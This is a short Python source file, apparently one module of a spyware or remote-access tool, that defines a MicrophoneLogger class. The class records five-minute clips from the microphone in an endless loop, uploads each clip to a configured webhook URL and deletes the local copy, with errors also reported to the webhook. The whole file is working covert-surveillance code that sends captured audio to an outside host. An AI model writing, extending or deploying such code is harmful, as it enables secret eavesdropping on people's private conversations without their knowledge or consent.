from utils import *

import sounddevice as sd
import scipy.io.wavfile as wav
import time
import os

class MicrophoneLogger:
    def __init__(self, software_dir_name, webhook_url):
        self.software_dir_name = software_dir_name
        self.webhook_url = webhook_url
        self.logs_path = get_logs_path(self.software_dir_name)
        self.interval = 300
    
    def log_microphone(self):
        try:
            recording = sd.rec(
                self.interval * 44100, samplerate=44100, channels=2, dtype="int16"
            )
            sd.wait()
            wav.write(os.path.join(self.logs_path, "microphone.wav"), 44100, recording)
            send_webhook(self.webhook_url, file={"microphone.wav": open(os.path.join(self.logs_path, "microphone.wav"), "rb")})
            os.remove(os.path.join(self.logs_path, "microphone.wav"))
        except Exception as e:
            send_webhook(self.webhook_url, f"Error logging microphone: {e}")
    
    def start(self):
        while True:
            self.log_microphone() # time.sleep is not needed here because the recording function already waits for the interval :D